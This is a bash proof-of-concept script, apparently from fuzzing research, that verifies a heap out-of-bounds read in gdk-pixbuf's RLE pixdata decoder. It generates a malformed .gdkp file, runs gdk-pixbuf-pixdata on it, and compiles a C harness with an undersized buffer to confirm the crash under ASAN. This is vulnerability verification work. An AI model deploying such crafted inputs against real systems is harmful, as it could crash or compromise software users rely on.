#!/usr/bin/env bash
# VULN-002 PoC runner: GdkPixdata RLE decoder heap OOB read

set -euo pipefail

POC_DIR="/data/ylwang/non-textfuzz/target/_poc/gdk-pixbuf/gdk-pixbuf_gdk-pixbuf-io_c"
BINARY="/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test/bin/gdk-pixbuf-pixdata"
GDK_BUILD="/data/ylwang/non-textfuzz/target/gdk-pixbuf/build_test"
INPUT="${POC_DIR}/vuln_002.gdkp"
OUTPUT_C="${POC_DIR}/vuln_002_out.c"
RESULT="${POC_DIR}/vuln_002_result.txt"
ASAN_LOG_PREFIX="${POC_DIR}/asan_002.log"
STATUS_FILE="${POC_DIR}/vuln_002_status.txt"

# Harness source and binary (compiled on demand)
HARNESS_SRC="${POC_DIR}/vuln_002_harness.c"
HARNESS_BIN="${POC_DIR}/vuln_002_harness"

echo "[*] Step 1: Generating malicious .gdkp file..."
python3 "${POC_DIR}/vuln_002_gen.py"

if [ ! -f "${INPUT}" ]; then
    echo "ERROR: Input file not generated: ${INPUT}" | tee "${STATUS_FILE}"
    exit 1
fi

# -------------------------------------------------------------------------
# Step 2a: Try the format-loader path via gdk-pixbuf-pixdata
# NOTE: gdk-pixbuf-pixdata converts images TO gdkp format by calling
# gdk_pixbuf_new_from_file(). When given a .gdkp input that matches the
# "GdkP" magic, the built-in pixdata loader decodes it via
# gdk_pixbuf_from_pixdata().  The OOB read occurs inside that function, but
# it may fall inside GLib's GString slack allocation, preventing ASAN from
# catching it at this boundary.  Step 2b uses a direct harness that
# allocates exactly 4 bytes for pixel_data, guaranteeing ASAN detects it.
# -------------------------------------------------------------------------

echo "[*] Step 2a: Running gdk-pixbuf-pixdata (format-loader path)..."
rm -f "${ASAN_LOG_PREFIX}".*

ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}" \
    "${BINARY}" \
    "${INPUT}" \
    "${OUTPUT_C}" \
    > "${RESULT}" 2>&1 || true

# -------------------------------------------------------------------------
# Step 2b: Compile and run direct harness (tight allocation → guaranteed ASAN)
# -------------------------------------------------------------------------
echo "[*] Step 2b: Compiling and running direct harness..."

cat > "${HARNESS_SRC}" << 'HARNESS_EOF'
/*
 * VULN-002 direct test harness.
 * Calls gdk_pixbuf_from_pixdata() with a 4-byte pixel_data allocation so
 * ASAN poisoning immediately follows the buffer; the OOB token read at
 * pixel_data[4] triggers heap-buffer-overflow.
 */
#include <gdk-pixbuf/gdk-pixbuf.h>
#include <gdk-pixbuf/gdk-pixdata.h>
#include <glib.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

int main(void) {
    /* Exactly 4 bytes: token=0x01 (raw, 1 pixel) + 3 payload bytes.
       After iteration 1 the loop has 6 output bytes still needed but
       rle_buffer is 0 bytes past the end of this allocation. */
    guint8 *pixel_data = (guint8 *)malloc(4);
    if (!pixel_data) { fprintf(stderr, "malloc failed\n"); return 1; }
    pixel_data[0] = 0x01;
    pixel_data[1] = 0xAA;
    pixel_data[2] = 0xBB;
    pixel_data[3] = 0xCC;

    GdkPixdata pixdata = {
        .magic        = GDK_PIXBUF_MAGIC_NUMBER,
        .length       = GDK_PIXDATA_HEADER_LENGTH + 4,
        .pixdata_type = GDK_PIXDATA_COLOR_TYPE_RGB |
                        GDK_PIXDATA_SAMPLE_WIDTH_8  |
                        GDK_PIXDATA_ENCODING_RLE,
        .rowstride    = 3,
        .width        = 1,
        .height       = 3,   /* needs 9 output bytes, only 4 bytes of RLE input */
        .pixel_data   = pixel_data,
    };

    fprintf(stderr, "[*] Direct harness: calling gdk_pixbuf_from_pixdata with 4-byte pixel_data\n");
    GError *error = NULL;
    GdkPixbuf *pixbuf = gdk_pixbuf_from_pixdata(&pixdata, TRUE, &error);

    if (pixbuf) {
        fprintf(stderr, "[!] Unexpectedly succeeded — %dx%d\n",
                gdk_pixbuf_get_width(pixbuf), gdk_pixbuf_get_height(pixbuf));
        g_object_unref(pixbuf);
    } else {
        fprintf(stderr, "[!] Load failed: %s\n", error ? error->message : "(no error)");
        if (error) g_error_free(error);
    }
    free(pixel_data);
    return 0;
}
HARNESS_EOF

HARNESS_RESULT="${POC_DIR}/vuln_002_harness_result.txt"
HARNESS_COMPILED=0

if gcc -fsanitize=address,undefined \
       -I${GDK_BUILD}/include/gdk-pixbuf-2.0 \
       -I/usr/include/glib-2.0 \
       -I/usr/lib/x86_64-linux-gnu/glib-2.0/include \
       -L${GDK_BUILD}/lib \
       -Wl,-rpath,${GDK_BUILD}/lib \
       -o "${HARNESS_BIN}" \
       "${HARNESS_SRC}" \
       -lgdk_pixbuf-2.0 \
       $(pkg-config --libs glib-2.0 gobject-2.0 2>/dev/null) \
       2>/dev/null; then
    HARNESS_COMPILED=1
    echo "[+] Harness compiled: ${HARNESS_BIN}"
    ASAN_OPTIONS="abort_on_error=0:log_path=${ASAN_LOG_PREFIX}" \
        "${HARNESS_BIN}" \
        > "${HARNESS_RESULT}" 2>&1 || true
else
    echo "[!] Harness compilation failed — skipping direct test"
fi

# -------------------------------------------------------------------------
# Step 3: Check results
# -------------------------------------------------------------------------
echo "[*] Step 3: Checking results..."

CRASH_FOUND=0

# Check result output for ASAN markers
if grep -q "ERROR: AddressSanitizer" "${RESULT}" 2>/dev/null; then
    echo "[+] ASAN error in gdk-pixbuf-pixdata output"
    CRASH_FOUND=1
fi

if [ -f "${HARNESS_RESULT}" ] && grep -q "ERROR: AddressSanitizer" "${HARNESS_RESULT}" 2>/dev/null; then
    echo "[+] ASAN error in direct harness output"
    CRASH_FOUND=1
fi

# Check ASAN log files
for f in "${ASAN_LOG_PREFIX}".* ; do
    if [ -f "${f}" ]; then
        echo "[+] Found ASAN log: ${f}"
        if grep -q "heap-buffer-overflow\|READ of\|SEGV\|stack-buffer-overflow" "${f}" 2>/dev/null; then
            echo "[+] ASAN log confirms crash"
            CRASH_FOUND=1
        fi
    fi
done

echo ""
echo "=== gdk-pixbuf-pixdata RESULT ==="
cat "${RESULT}"

if [ "${HARNESS_COMPILED}" -eq 1 ] && [ -f "${HARNESS_RESULT}" ]; then
    echo ""
    echo "=== DIRECT HARNESS RESULT ==="
    cat "${HARNESS_RESULT}"
fi

echo ""
echo "=== ASAN LOG(S) ==="
for f in "${ASAN_LOG_PREFIX}".* ; do
    [ -f "${f}" ] && echo "--- $f ---" && cat "${f}"
done

echo ""
echo "=== STATUS ==="
if [ "${CRASH_FOUND}" -eq 1 ]; then
    echo "VERIFIED_CRASH" | tee "${STATUS_FILE}"
    echo "[+] VULN-002 VERIFIED: gdk_pixbuf_from_pixdata heap OOB read confirmed by ASAN"
else
    echo "UNVERIFIED" | tee "${STATUS_FILE}"
    echo "[!] No ASAN crash detected"
fi
